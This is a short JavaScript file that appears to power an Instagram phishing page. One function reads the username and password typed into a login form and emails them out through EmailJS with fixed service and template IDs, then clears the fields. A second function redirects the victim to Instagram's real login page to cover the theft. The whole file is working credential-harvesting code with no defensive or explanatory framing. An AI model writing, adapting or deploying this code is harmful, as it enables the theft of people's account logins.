function sendMail() {
  // Get the username and password from the input fields
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  // Create the parameters to send
  var params = {
    username_id: username,
    passwort_id: password
  };

  const serviceid = 'service_udupifp';
  const templateid = 'template_rfoq0w4';

  // Send the email using EmailJS
  emailjs.send(serviceid, templateid, params)
    .then(res => {
      document.getElementById("username").value = "";
      document.getElementById("password").value = "";
    })
    .catch(err => alert(err));
}




function forwarding(){
  document.getElementById("LoginButton").addEventListener("click", function() {
    // Redirect to Instagram login page
    window.location.href = "https://www.instagram.com/accounts/login/";
  });
  }
